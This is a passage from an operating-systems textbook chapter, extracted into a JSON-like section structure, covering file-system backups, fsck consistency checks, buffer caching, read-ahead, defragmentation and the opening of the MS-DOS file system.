dumping process, the\r\nresulting dump may be inconsistent. However, since making a dump may take\r\nhours, it may be necessary to take the system offline for much of the night to make\r\nthe backup, something that is not always acceptable. For this reason, algorithms\r\nhave been devised for making rapid snapshots of the file-system state by copying\r\ncritical data structures, and then requiring future changes to files and directories to\r\ncopy the blocks instead of updating them in place (Hutchinson et al., 1999). In this\r\nway, the file system is effectively frozen at the moment of the snapshot, so it can\r\nbe backed up at leisure afterward.\r\nFifth and last, making backups introduces many nontechnical problems into an\r\norganization. The best online security system in the world may be useless if the\r\nsystem administrator keeps all the backup disks or tapes in his office and leaves it\r\nopen and unguarded whenever he walks down the hall to get coffee. All a spy has\r\nto do is pop in for a second, put one tiny disk or tape in his pocket, and saunter off\r\njauntily. Goodbye security. Also, making a daily backup has little use if the fire\r\nthat burns down the computers also burns up all the backup disks. For this reason,\r\nbackup disks should be kept off-site, but that introduces more security risks (be\u0002cause now two sites must be secured). For a thorough discussion of these and\r\nother practical administration issues, see Nemeth et al. (2013). Below we will dis\u0002cuss only the technical issues involved in making file-system backups.\r\nTw o strategies can be used for dumping a disk to a backup disk: a physical\r\ndump or a logical dump. A physical dump starts at block 0 of the disk, writes all\r\nthe disk blocks onto the output disk in order, and stops when it has copied the last\r\none. Such a program is so simple that it can probably be made 100% bug free,\r\nsomething that can probably not be said about any other useful program.\r\nNevertheless, it is worth making several comments about physical dumping.\r\nFor one thing, there is no value in backing up unused disk blocks. If the dumping\r\nprogram can obtain access to the free-block data structure, it can avoid dumping\r\nunused blocks. However, skipping unused blocks requires writing the number of\r\neach block in front of the block (or the equivalent), since it is no longer true that\r\nblock k on the backup was block k on the disk.\r\nA second concern is dumping bad blocks. It is nearly impossible to manufac\u0002ture large disks without any defects. Some bad blocks are always present. Some\u0002times when a low-level format is done, the bad blocks are detected, marked as bad,\r\nand replaced by spare blocks reserved at the end of each track for just such emer\u0002gencies. In many cases, the disk controller handles bad-block replacement\r\ntransparently without the operating system even knowing about it.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 309\r\nHowever, sometimes blocks go bad after formatting, in which case the operat\u0002ing system will eventually detect them. Usually, it solves the problem by creating a\r\n‘‘file’’ consisting of all the bad blocks—just to make sure they nev er appear in the\r\nfree-block pool and are never assigned. Needless to say, this file is completely\r\nunreadable.\r\nIf all bad blocks are remapped by the disk controller and hidden from the oper\u0002ating system as just described, physical dumping works fine. On the other hand, if\r\nthey are visible to the operating system and maintained in one or more bad-block\r\nfiles or bitmaps, it is absolutely essential that the physical dumping program get\r\naccess to this information and avoid dumping them to prevent endless disk read er\u0002rors while trying to back up the bad-block file.\r\nWindows systems have paging and hibernation files that are not needed in the\r\nev ent of a restore and should not be backed up in the first place. Specific systems\r\nmay also have other internal files that should not be backed up, so the dumping\r\nprogram needs to be aware of them.\r\nThe main advantages of physical dumping are simplicity and great speed (basi\u0002cally, it can run at the speed of the disk). The main disadvantages are the inability\r\nto skip selected directories, make incremental dumps, and restore individual files\r\nupon request. For these reasons, most installations make logical dumps.\r\nA logical dump starts at one or more specified directories and recursively\r\ndumps all files and directories found there that have changed since some given\r\nbase date (e.g., the last backup for an incremental dump or system installation for a\r\nfull dump). Thus, in a logical dump, the dump disk gets a series of carefully iden\u0002tified directories and files, which makes it easy to restore a specific file or directory\r\nupon request.\r\nSince logical dumping is the most common form, let us examine a common al\u0002gorithm in detail using the example of Fig. 4-25 to guide us. Most UNIX systems\r\nuse this algorithm. In the figure we see a file tree with directories (squares) and\r\nfiles (circles). The shaded items have been modified since the base date and thus\r\nneed to be dumped. The unshaded ones do not need to be dumped.\r\nThis algorithm also dumps all directories (even unmodified ones) that lie on\r\nthe path to a modified file or directory for two reasons. The first reason is to make\r\nit possible to restore the dumped files and directories to a fresh file system on a dif\u0002ferent computer. In this way, the dump and restore programs can be used to tran\u0002sport entire file systems between computers.\r\nThe second reason for dumping unmodified directories above modified files is\r\nto make it possible to incrementally restore a single file (possibly to handle recov\u0002ery from stupidity). Suppose that a full file-system dump is done Sunday evening\r\nand an incremental dump is done on Monday evening. On Tuesday the directory\r\n/usr/jhs/proj/nr3 is removed, along with all the directories and files under it. On\r\nWednesday morning bright and early suppose the user wants to restore the file\r\n/usr/jhs/proj/nr3/plans/summary. However, it is not possible to just restore the file\r\nsummary because there is no place to put it. The directories nr3 and plans must be\n310 FILE SYSTEMS CHAP. 4\r\n1\r\n18\r\n19\r\n5\r\n6\r\n27\r\n7 10 20 22 30\r\n29\r\n11 14 23\r\n2\r\n3 4\r\n8 9\r\n12 13 15\r\n31\r\n28\r\n32\r\n24 25 26\r\n16\r\n17\r\n21\r\nFile that\r\nhas changed\r\nFile that has\r\nnot changed\r\nRoot directory\r\nDirectory \r\nthat has not \r\nchanged\r\nFigure 4-25. A file system to be dumped. The squares are directories and the cir\u0002cles are files. The shaded items have been modified since the last dump. Each di\u0002rectory and file is labeled by its i-node number.\r\nrestored first. To get their owners, modes, times, and whatever, correct, these di\u0002rectories must be present on the dump disk even though they themselves were not\r\nmodified since the previous full dump.\r\nThe dump algorithm maintains a bitmap indexed by i-node number with sever\u0002al bits per i-node. Bits will be set and cleared in this map as the algorithm pro\u0002ceeds. The algorithm operates in four phases. Phase 1 begins at the starting direc\u0002tory (the root in this example) and examines all the entries in it. For each modified\r\nfile, its i-node is marked in the bitmap. Each directory is also marked (whether or\r\nnot it has been modified) and then recursively inspected.\r\nAt the end of phase 1, all modified files and all directories have been marked in\r\nthe bitmap, as shown (by shading) in Fig. 4-26(a). Phase 2 conceptually recur\u0002sively walks the tree again, unmarking any directories that have no modified files\r\nor directories in them or under them. This phase leaves the bitmap as shown in\r\nFig. 4-26(b). Note that directories 10, 11, 14, 27, 29, and 30 are now unmarked be\u0002cause they contain nothing under them that has been modified. They will not be\r\ndumped. By way of contrast, directories 5 and 6 will be dumped even though they\r\nthemselves have not been modified because they will be needed to restore today’s\r\nchanges to a fresh machine. For efficiency, phases 1 and 2 can be combined in one\r\ntree walk.\r\nAt this point it is known which directories and files must be dumped. These are\r\nthe ones that are marked in Fig. 4-26(b). Phase 3 consists of scanning the i-nodes\r\nin numerical order and dumping all the directories that are marked for dumping.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 311\r\n(d) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32\r\n(c) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32\r\n(b) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32\r\n(a) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32\r\nFigure 4-26. Bitmaps used by the logical dumping algorithm.\r\nThese are shown in Fig. 4-26(c). Each directory is prefixed by the directory’s at\u0002tributes (owner, times, etc.) so that they can be restored. Finally, in phase 4, the\r\nfiles marked in Fig. 4-26(d) are also dumped, again prefixed by their attributes.\r\nThis completes the dump.\r\nRestoring a file system from the dump disk is straightforward. To start with,\r\nan empty file system is created on the disk. Then the most recent full dump is re\u0002stored. Since the directories appear first on the dump disk, they are all restored\r\nfirst, giving a skeleton of the file system. Then the files themselves are restored.\r\nThis process is then repeated with the first incremental dump made after the full\r\ndump, then the next one, and so on.\r\nAlthough logical dumping is straightforward, there are a few tricky issues. For\r\none, since the free block list is not a file, it is not dumped and hence it must be\r\nreconstructed from scratch after all the dumps have been restored. Doing so is al\u0002ways possible since the set of free blocks is just the complement of the set of\r\nblocks contained in all the files combined.\r\nAnother issue is links. If a file is linked to two or more directories, it is impor\u0002tant that the file is restored only one time and that all the directories that are sup\u0002posed to point to it do so.\r\nStill another issue is the fact that UNIX files may contain holes. It is legal to\r\nopen a file, write a few bytes, then seek to a distant file offset and write a few more\r\nbytes. The blocks in between are not part of the file and should not be dumped and\r\nmust not be restored. Core files often have a hole of hundreds of megabytes be\u0002tween the data segment and the stack. If not handled properly, each restored core\r\nfile will fill this area with zeros and thus be the same size as the virtual address\r\nspace (e.g., 232 bytes, or worse yet, 264 bytes).\r\nFinally, special files, named pipes, and the like (anything that is not a real file)\r\nshould never be dumped, no matter in which directory they may occur (they need\r\nnot be confined to /dev). For more information about file-system backups, see\r\nChervenak et al., (1998) and Zwicky (1991).\n312 FILE SYSTEMS CHAP. 4"
          },
          "4.4.3 File-System Consistency": {
            "page": 343,
            "content": "4.4.3 File-System Consistency\r\nAnother area where reliability is an issue is file-system consistency. Many file\r\nsystems read blocks, modify them, and write them out later. If the system crashes\r\nbefore all the modified blocks have been written out, the file system can be left in\r\nan inconsistent state. This problem is especially critical if some of the blocks that\r\nhave not been written out are i-node blocks, directory blocks, or blocks containing\r\nthe free list.\r\nTo deal with inconsistent file systems, most computers have a utility program\r\nthat checks file-system consistency. For example, UNIX has fsck; Windows has sfc\r\n(and others). This utility can be run whenever the system is booted, especially\r\nafter a crash. The description below tells how fsck works. Sfc is somewhat dif\u0002ferent because it works on a different file system, but the general principle of using\r\nthe file system’s inherent redundancy to repair it is still valid. All file-system\r\ncheckers verify each file system (disk partition) independently of the other ones.\r\nTw o kinds of consistency checks can be made: blocks and files. To check for\r\nblock consistency, the program builds two tables, each one containing a counter for\r\neach block, initially set to 0. The counters in the first table keep track of how\r\nmany times each block is present in a file; the counters in the second table record\r\nhow often each block is present in the free list (or the bitmap of free blocks).\r\nThe program then reads all the i-nodes using a raw device, which ignores the\r\nfile structure and just returns all the disk blocks starting at 0. Starting from an i\u0002node, it is possible to build a list of all the block numbers used in the correspond\u0002ing file. As each block number is read, its counter in the first table is incremented.\r\nThe program then examines the free list or bitmap to find all the blocks that are not\r\nin use. Each occurrence of a block in the free list results in its counter in the sec\u0002ond table being incremented.\r\nIf the file system is consistent, each block will have a 1 either in the first table\r\nor in the second table, as illustrated in Fig. 4-27(a). However, as a result of a\r\ncrash, the tables might look like Fig. 4-27(b), in which block 2 does not occur in\r\neither table. It will be reported as being a missing block. While missing blocks\r\ndo no real harm, they waste space and thus reduce the capacity of the disk. The\r\nsolution to missing blocks is straightforward: the file system checker just adds\r\nthem to the free list.\r\nAnother situation that might occur is that of Fig. 4-27(c). Here we see a block,\r\nnumber 4, that occurs twice in the free list. (Duplicates can occur only if the free\r\nlist is really a list; with a bitmap it is impossible.) The solution here is also simple:\r\nrebuild the free list.\r\nThe worst thing that can happen is that the same data block is present in two or\r\nmore files, as shown in Fig. 4-27(d) with block 5. If either of these files is re\u0002moved, block 5 will be put on the free list, leading to a situation in which the same\r\nblock is both in use and free at the same time. If both files are removed, the block\r\nwill be put onto the free list twice.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 313\r\n1 1 0 1 0 1 1 1 1 0 0 1 1 1 0 0\r\n0 1 2 3 4 5 6 7 8 9 101112131415\r\nBlock number\r\nBlocks in use\r\n0 0 1 0 1 0 0 0 0 1 1 0 0 0 1 1 Free blocks\r\n(a)\r\n1 1 0 1 0 1 1 1 1 0 0 1 1 1 0 0\r\n0 1 2 3 4 5 6 7 8 9 101112131415\r\nBlocks in use\r\n0 0 1 0 2 0 0 0 0 1 1 0 0 0 1 1 Free blocks\r\n(c)\r\n1 1 0 1 0 1 1 1 1 0 0 1 1 1 0 0\r\n0 1 2 3 4 5 6 7 8 9 101112131415\r\nBlock number\r\nBlocks in use\r\n0 0 0 0 1 0 0 0 0 1 1 0 0 0 1 1 Free blocks\r\n(b)\r\n1 1 0 1 0 2 1 1 1 0 0 1 1 1 0 0\r\n0 1 2 3 4 5 6 7 8 9 101112131415\r\nBlocks in use\r\n0 0 1 0 1 0 0 0 0 1 1 0 0 0 1 1 Free blocks\r\n(d)\r\nBlock number Block number\r\nFigure 4-27. File-system states. (a) Consistent. (b) Missing block. (c) Dupli\u0002cate block in free list. (d) Duplicate data block.\r\nThe appropriate action for the file-system checker to take is to allocate a free\r\nblock, copy the contents of block 5 into it, and insert the copy into one of the files.\r\nIn this way, the information content of the files is unchanged (although almost\r\nassuredly one is garbled), but the file-system structure is at least made consistent.\r\nThe error should be reported, to allow the user to inspect the damage.\r\nIn addition to checking to see that each block is properly accounted for, the\r\nfile-system checker also checks the directory system. It, too, uses a table of count\u0002ers, but these are per file, rather than per block. It starts at the root directory and\r\nrecursively descends the tree, inspecting each directory in the file system. For\r\nev ery i-node in every directory, it increments a counter for that file’s usage count.\r\nRemember that due to hard links, a file may appear in two or more directories.\r\nSymbolic links do not count and do not cause the counter for the target file to be\r\nincremented.\r\nWhen the checker is all done, it has a list, indexed by i-node number, telling\r\nhow many directories contain each file. It then compares these numbers with the\r\nlink counts stored in the i-nodes themselves. These counts start at 1 when a file is\r\ncreated and are incremented each time a (hard) link is made to the file. In a consis\u0002tent file system, both counts will agree. However, two kinds of errors can occur:\r\nthe link count in the i-node can be too high or it can be too low.\r\nIf the link count is higher than the number of directory entries, then even if all\r\nthe files are removed from the directories, the count will still be nonzero and the i\u0002node will not be removed. This error is not serious, but it wastes space on the disk\r\nwith files that are not in any directory. It should be fixed by setting the link count\r\nin the i-node to the correct value.\r\nThe other error is potentially catastrophic. If two directory entries are linked\r\nto a file, but the i-node says that there is only one, when either directory entry is re\u0002moved, the i-node count will go to zero. When an i-node count goes to zero, the\n314 FILE SYSTEMS CHAP. 4\r\nfile system marks it as unused and releases all of its blocks. This action will result\r\nin one of the directories now pointing to an unused i-node, whose blocks may soon\r\nbe assigned to other files. Again, the solution is just to force the link count in the i\u0002node to the actual number of directory entries.\r\nThese two operations, checking blocks and checking directories, are often inte\u0002grated for efficiency reasons (i.e., only one pass over the i-nodes is required).\r\nOther checks are also possible. For example, directories have a definite format,\r\nwith i-node numbers and ASCII names. If an i-node number is larger than the\r\nnumber of i-nodes on the disk, the directory has been damaged.\r\nFurthermore, each i-node has a mode, some of which are legal but strange,\r\nsuch as 0007, which allows the owner and his group no access at all, but allows\r\noutsiders to read, write, and execute the file. It might be useful to at least report\r\nfiles that give outsiders more rights than the owner. Directories with more than,\r\nsay, 1000 entries are also suspicious. Files located in user directories, but which\r\nare owned by the superuser and have the SETUID bit on, are potential security\r\nproblems because such files acquire the powers of the superuser when executed by\r\nany user. With a little effort, one can put together a fairly long list of technically\r\nlegal but still peculiar situations that might be worth reporting.\r\nThe previous paragraphs have discussed the problem of protecting the user\r\nagainst crashes. Some file systems also worry about protecting the user against\r\nhimself. If the user intends to type\r\nrm *.o\r\nto remove all the files ending with .o (compiler-generated object files), but accide\u0002ntally types\r\nrm * .o\r\n(note the space after the asterisk), rm will remove all the files in the current direc\u0002tory and then complain that it cannot find .o. In Windows, files that are removed\r\nare placed in the recycle bin (a special directory), from which they can later be\r\nretrieved if need be. Of course, no storage is reclaimed until they are actually\r\ndeleted from this directory."
          },
          "4.4.4 File-System Performance": {
            "page": 345,
            "content": "4.4.4 File-System Performance\r\nAccess to disk is much slower than access to memory. Reading a 32-bit memo\u0002ry word might take 10 nsec. Reading from a hard disk might proceed at 100\r\nMB/sec, which is four times slower per 32-bit word, but to this must be added\r\n5–10 msec to seek to the track and then wait for the desired sector to arrive under\r\nthe read head. If only a single word is needed, the memory access is on the order\r\nof a million times as fast as disk access. As a result of this difference in access\r\ntime, many file systems have been designed with various optimizations to improve\r\nperformance. In this section we will cover three of them.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 315\r\nCaching\r\nThe most common technique used to reduce disk accesses is the block cache\r\nor buffer cache. (Cache is pronounced ‘‘cash’’ and is derived from the French\r\ncacher, meaning to hide.) In this context, a cache is a collection of blocks that log\u0002ically belong on the disk but are being kept in memory for performance reasons.\r\nVarious algorithms can be used to manage the cache, but a common one is to\r\ncheck all read requests to see if the needed block is in the cache. If it is, the read\r\nrequest can be satisfied without a disk access. If the block is not in the cache, it is\r\nfirst read into the cache and then copied to wherever it is needed. Subsequent re\u0002quests for the same block can be satisfied from the cache.\r\nOperation of the cache is illustrated in Fig. 4-28. Since there are many (often\r\nthousands of) blocks in the cache, some way is needed to determine quickly if a\r\ngiven block is present. The usual way is to hash the device and disk address and\r\nlook up the result in a hash table. All the blocks with the same hash value are\r\nchained together on a linked list so that the collision chain can be followed.\r\nHash table Front (LRU) Rear (MRU)\r\nFigure 4-28. The buffer cache data structures.\r\nWhen a block has to be loaded into a full cache, some block has to be removed\r\n(and rewritten to the disk if it has been modified since being brought in). This\r\nsituation is very much like paging, and all the usual page-replacement algorithms\r\ndescribed in Chap. 3, such as FIFO, second chance, and LRU, are applicable. One\r\npleasant difference between paging and caching is that cache references are rel\u0002atively infrequent, so that it is feasible to keep all the blocks in exact LRU order\r\nwith linked lists.\r\nIn Fig. 4-28, we see that in addition to the collision chains starting at the hash\r\ntable, there is also a bidirectional list running through all the blocks in the order of\r\nusage, with the least recently used block on the front of this list and the most\r\nrecently used block at the end. When a block is referenced, it can be removed from\r\nits position on the bidirectional list and put at the end. In this way, exact LRU\r\norder can be maintained.\r\nUnfortunately, there is a catch. Now that we have a situation in which exact\r\nLRU is possible, it turns out that LRU is undesirable. The problem has to do with\n316 FILE SYSTEMS CHAP. 4\r\nthe crashes and file-system consistency discussed in the previous section. If a criti\u0002cal block, such as an i-node block, is read into the cache and modified, but not\r\nrewritten to the disk, a crash will leave the file system in an inconsistent state. If\r\nthe i-node block is put at the end of the LRU chain, it may be quite a while before\r\nit reaches the front and is rewritten to the disk.\r\nFurthermore, some blocks, such as i-node blocks, are rarely referenced two\r\ntimes within a short interval. These considerations lead to a modified LRU scheme,\r\ntaking two factors into account:\r\n1. Is the block likely to be needed again soon?\r\n2. Is the block essential to the consistency of the file system?\r\nFor both questions, blocks can be divided into categories such as i-node blocks,\r\nindirect blocks, directory blocks, full data blocks, and partially full data blocks.\r\nBlocks that will probably not be needed again soon go on the front, rather than the\r\nrear of the LRU list, so their buffers will be reused quickly. Blocks that might be\r\nneeded again soon, such as a partly full block that is being written, go on the end\r\nof the list, so they will stay around for a long time.\r\nThe second question is independent of the first one. If the block is essential to\r\nthe file-system consistency (basically, everything except data blocks), and it has\r\nbeen modified, it should be written to disk immediately, reg ardless of which end of\r\nthe LRU list it is put on. By writing critical blocks quickly, we greatly reduce the\r\nprobability that a crash will wreck the file system. While a user may be unhappy if\r\none of his files is ruined in a crash, he is likely to be far more unhappy if the whole\r\nfile system is lost.\r\nEven with this measure to keep the file-system integrity intact, it is undesirable\r\nto keep data blocks in the cache too long before writing them out. Consider the\r\nplight of someone who is using a personal computer to write a book. Even if our\r\nwriter periodically tells the editor to write the file being edited to the disk, there is\r\na good chance that everything will still be in the cache and nothing on the disk. If\r\nthe system crashes, the file-system structure will not be corrupted, but a whole\r\nday’s work will be lost.\r\nThis situation need not happen very often before we have a fairly unhappy\r\nuser. Systems take two approaches to dealing with it. The UNIX way is to have a\r\nsystem call, sync, which forces all the modified blocks out onto the disk im\u0002mediately. When the system is started up, a program, usually called update, is\r\nstarted up in the background to sit in an endless loop issuing sync calls, sleeping\r\nfor 30 sec between calls. As a result, no more than 30 seconds of work is lost due\r\nto a crash.\r\nAlthough Windows now has a system call equivalent to sync, called FlushFile\u0002Buffers, in the past it did not. Instead, it had a different strategy that was in some\r\nways better than the UNIX approach (and in some ways worse). What it did was\r\nto write every modified block to disk as soon as it was written to the cache. Caches\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 317\r\nin which all modified blocks are written back to the disk immediately are called\r\nwrite-through caches. They require more disk I/O than nonwrite-through caches.\r\nThe difference between these two approaches can be seen when a program\r\nwrites a 1-KB block full, one character at a time. UNIX will collect all the charac\u0002ters in the cache and write the block out once every 30 seconds, or whenever the\r\nblock is removed from the cache. With a write-through cache, there is a disk access\r\nfor every character written. Of course, most programs do internal buffering, so\r\nthey normally write not a character, but a line or a larger unit on each wr ite system\r\ncall.\r\nA consequence of this difference in caching strategy is that just removing a\r\ndisk from a UNIX system without doing a sync will almost always result in lost\r\ndata, and frequently in a corrupted file system as well. With write-through caching\r\nno problem arises. These differing strategies were chosen because UNIX was de\u0002veloped in an environment in which all disks were hard disks and not removable,\r\nwhereas the first Windows file system was inherited from MS-DOS, which started\r\nout in the floppy-disk world. As hard disks became the norm, the UNIX approach,\r\nwith its better efficiency (but worse reliability), became the norm, and it is also\r\nused now on Windows for hard disks. However, NTFS takes other measures (e.g.,\r\njournaling) to improve reliability, as discussed earlier.\r\nSome operating systems integrate the buffer cache with the page cache. This is\r\nespecially attractive when memory-mapped files are supported. If a file is mapped\r\nonto memory, then some of its pages may be in memory because they were de\u0002mand paged in. Such pages are hardly different from file blocks in the buffer\r\ncache. In this case, they can be treated the same way, with a single cache for both\r\nfile blocks and pages.\r\nBlock Read Ahead\r\nA second technique for improving perceived file-system performance is to try\r\nto get blocks into the cache before they are needed to increase the hit rate. In par\u0002ticular, many files are read sequentially. When the file system is asked to produce\r\nblock k in a file, it does that, but when it is finished, it makes a sneaky check in the\r\ncache to see if block k + 1 is already there. If it is not, it schedules a read for block\r\nk + 1 in the hope that when it is needed, it will have already arrived in the cache.\r\nAt the very least, it will be on the way.\r\nOf course, this read-ahead strategy works only for files that are actually being\r\nread sequentially. If a file is being randomly accessed, read ahead does not help.\r\nIn fact, it hurts by tying up disk bandwidth reading in useless blocks and removing\r\npotentially useful blocks from the cache (and possibly tying up more disk band\u0002width writing them back to disk if they are dirty). To see whether read ahead is\r\nworth doing, the file system can keep track of the access patterns to each open file.\r\nFor example, a bit associated with each file can keep track of whether the file is in\r\n‘‘sequential-access mode’’ or ‘‘random-access mode.’’ Initially, the file is given the\n318 FILE SYSTEMS CHAP. 4\r\nbenefit of the doubt and put in sequential-access mode. However, whenever a seek\r\nis done, the bit is cleared. If sequential reads start happening again, the bit is set\r\nonce again. In this way, the file system can make a reasonable guess about wheth\u0002er it should read ahead or not. If it gets it wrong once in a while, it is not a disas\u0002ter, just a little bit of wasted disk bandwidth.\r\nReducing Disk-Arm Motion\r\nCaching and read ahead are not the only ways to increase file-system perfor\u0002mance. Another important technique is to reduce the amount of disk-arm motion\r\nby putting blocks that are likely to be accessed in sequence close to each other,\r\npreferably in the same cylinder. When an output file is written, the file system has\r\nto allocate the blocks one at a time, on demand. If the free blocks are recorded in a\r\nbitmap, and the whole bitmap is in main memory, it is easy enough to choose a free\r\nblock as close as possible to the previous block. With a free list, part of which is on\r\ndisk, it is much harder to allocate blocks close together.\r\nHowever, even with a free list, some block clustering can be done. The trick is\r\nto keep track of disk storage not in blocks, but in groups of consecutive blocks. If\r\nall sectors consist of 512 bytes, the system could use 1-KB blocks (2 sectors) but\r\nallocate disk storage in units of 2 blocks (4 sectors). This is not the same as having\r\n2-KB disk blocks, since the cache would still use 1-KB blocks and disk transfers\r\nwould still be 1 KB, but reading a file sequentially on an otherwise idle system\r\nwould reduce the number of seeks by a factor of two, considerably improving per\u0002formance. A variation on the same theme is to take account of rotational posi\u0002tioning. When allocating blocks, the system attempts to place consecutive blocks\r\nin a file in the same cylinder.\r\nAnother performance bottleneck in systems that use i-nodes or anything like\r\nthem is that reading even a short file requires two disk accesses: one for the i-node\r\nand one for the block. The usual i-node placement is shown in Fig. 4-29(a). Here\r\nall the i-nodes are near the start of the disk, so the average distance between an i\u0002node and its blocks will be half the number of cylinders, requiring long seeks.\r\nOne easy performance improvement is to put the i-nodes in the middle of the\r\ndisk, rather than at the start, thus reducing the average seek between the i-node and\r\nthe first block by a factor of two. Another idea, shown in Fig. 4-29(b), is to divide\r\nthe disk into cylinder groups, each with its own i-nodes, blocks, and free list\r\n(McKusick et al., 1984). When creating a new file, any i-node can be chosen, but\r\nan attempt is made to find a block in the same cylinder group as the i-node. If\r\nnone is available, then a block in a nearby cylinder group is used.\r\nOf course, disk-arm movement and rotation time are relevant only if the disk\r\nhas them. More and more computers come equipped with solid-state disks (SSD)\r\nwhich have no moving parts whatsoever. For these disks, built on the same technol\u0002ogy as flash cards, random accesses are just as fast as sequential ones and many of\r\nthe problems of traditional disks go away. Unfortunately, new problems emerge.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 319\r\nI-nodes are\r\nlocated near\r\nthe start\r\nof the disk\r\nDisk is divided into\r\ncylinder groups, each\r\nwith its own i-nodes\r\n(a) (b)\r\nCylinder group\r\nFigure 4-29. (a) I-nodes placed at the start of the disk. (b) Disk divided into cyl\u0002inder groups, each with its own blocks and i-nodes.\r\nFor instance, SSDs have peculiar properties when it comes to reading, writing, and\r\ndeleting. In particular, each block can be written only a limited number of times, so\r\ngreat care is taken to spread the wear on the disk evenly."
          },
          "4.4.5 Defragmenting Disks": {
            "page": 350,
            "content": "4.4.5 Defragmenting Disks\r\nWhen the operating system is initially installed, the programs and files it needs\r\nare installed consecutively starting at the beginning of the disk, each one directly\r\nfollowing the previous one. All free disk space is in a single contiguous unit fol\u0002lowing the installed files. However, as time goes on, files are created and removed\r\nand typically the disk becomes badly fragmented, with files and holes all over the\r\nplace. As a consequence, when a new file is created, the blocks used for it may be\r\nspread all over the disk, giving poor performance.\r\nThe performance can be restored by moving files around to make them contig\u0002uous and to put all (or at least most) of the free space in one or more large contigu\u0002ous regions on the disk. Windows has a program, defrag, that does precisely this.\r\nWindows users should run it regularly, except on SSDs.\r\nDefragmentation works better on file systems that have a lot of free space in a\r\ncontiguous region at the end of the partition. This space allows the defragmentation\r\nprogram to select fragmented files near the start of the partition and copy all their\r\nblocks to the free space. Doing so frees up a contiguous block of space near the\r\nstart of the partition into which the original or other files can be placed contigu\u0002ously. The process can then be repeated with the next chunk of disk space, etc.\r\nSome files cannot be moved, including the paging file, the hibernation file, and\r\nthe journaling log, because the administration that would be required to do this is\n320 FILE SYSTEMS CHAP. 4\r\nmore trouble than it is worth. In some systems, these are fixed-size contiguous\r\nareas anyway, so they do not have to be defragmented. The one time when their\r\nlack of mobility is a problem is when they happen to be near the end of the parti\u0002tion and the user wants to reduce the partition size. The only way to solve this\r\nproblem is to remove them altogether, resize the partition, and then recreate them\r\nafterward.\r\nLinux file systems (especially ext2 and ext3) generally suffer less from defrag\u0002mentation than Windows systems due to the way disk blocks are selected, so man\u0002ual defragmentation is rarely required. Also, SSDs do not really suffer from frag\u0002mentation at all. In fact, defragmenting an SSD is counterproductive. Not only is\r\nthere no gain in performance, but SSDs wear out, so defragmenting them merely\r\nshortens their lifetimes."
          }
        }
      },
      "4.5 EXAMPLE FILE SYSTEMS": {
        "page": 351,
        "children": {
          "4.5.1 The MS-DOS File System": {
            "page": 351,
            "content": "4.5.1 The MS-DOS File System\r\nThe MS-DOS file system is the one the first IBM PCs came with. It was the\r\nmain file system up through Windows 98 and Windows ME. It is still supported\r\non Windows 2000, Windows XP, and Windows Vista, although it is no longer stan\u0002dard on new PCs now except for floppy disks. However, it and an extension of it\r\n(FAT -32) have become widely used for many embedded systems. Most digital\r\ncameras use it. Many MP3 players use it exclusively. The popular Apple iPod uses\r\nit as the default file system, although knowledgeable hackers can reformat the iPod\r\nand install a different file system. Thus the number of electronic devices using the\r\nMS-DOS file system is vastly larger now than at any time in the past, and certainly\r\nmuch larger than the number using the more modern NTFS file system. For that\r\nreason alone, it is worth looking at in some detail.\r\nTo read a file, an MS-DOS program must first make an open system call to get\r\na handle for it. The open system call specifies a path, which may be either absolute\r\nor relative to the current working directory. The path is looked up component by\r\ncomponent until the final directory is located and read into memory. It is then\r\nsearched for the file to be opened.\r\nAlthough MS-DOS directories are variable sized, they use a fixed-size 32-byte\r\ndirectory entry. The format of an MS-DOS directory entry is shown in Fig. 4-30. It\r\ncontains the file name, attributes, creation date and time, starting block, and exact\nSEC. 4.5 EXAMPLE FILE SYSTEMS 321\r\nfile size. File names shorter than 8 + 3 characters are left justified and padded with\r\nspaces on the right, in each field separately. The Attributes field is new and con\u0002tains bits to indicate that a file is read-only, needs to be archived, is hidden, or is a\r\nsystem file. Read-only files cannot be written. This is to protect them from acci\u0002dental damage. The archived bit has no actual operating system function (i.e., MS\u0002DOS does not examine or set it). The intention is to allow user-level archive pro\u0002grams to clear it upon archiving a file and to have other programs set it when modi\u0002fying a file. In this way, a backup program can just examine this attribute bit on\r\nev ery file to see which files to back up. The hidden bit can be set to prevent a file\r\nfrom appearing in directory listings. Its main use is to avoid confusing novice users\r\nwith files they might not understand. Finally, the system bit also hides files. In ad\u0002dition, system files cannot accidentally be deleted using the del command. The\r\nmain components of MS-DOS have this bit set. \r\n\r\nSize\r\nExtension Attributes Reserved Date First\r\nblock\r\nnumber\r\nBytes 8 3 1 10 2\r\nFile name\r\nTime\r\n2 2 4\r\nFigure 4-30. The MS-DOS directory entry.\r\nThe directory entry also contains the date and time the file was created or last\r\nmodified. The time is accurate only to ±2 sec because it is stored in a 2-byte field,\r\nwhich can store only 65,536 unique values (a day contains 86,400 seconds). The\r\ntime field is subdivided into seconds (5 bits), minutes (6 bits), and hours (5 bits).\r\nThe date counts in days using three subfields: day (5 bits), month (4 bits), and year\r\n− 1980 (7 bits). With a 7-bit number for the year and time beginning in 1980, the\r\nhighest expressible year is 2107. Thus MS-DOS has a built-in Y2108 problem. To\r\navoid catastrophe, MS-DOS users should begin with Y2108 compliance as early as\r\npossible. If MS-DOS had used the combined date and time fields as a 32-bit sec\u0002onds counter, it could have represented every second exactly and delayed the catas\u0002trophe until 2116.\r\nMS-DOS stores the file size as a 32-bit number, so in theory files can be as\r\nlarge as 4 GB. However, other limits (described below) restrict the maximum file\r\nsize to 2 GB or less. A surprisingly large part of the entry (10 bytes) is unused.\r\nMS-DOS keeps track of file blocks via a file allocation table in main memory.\r\nThe directory entry contains the number of the first file block. This number is used\r\nas an index into a 64K entry FAT in main memory. By following the chain, all the\r\nblocks can be found. The operation of the FAT 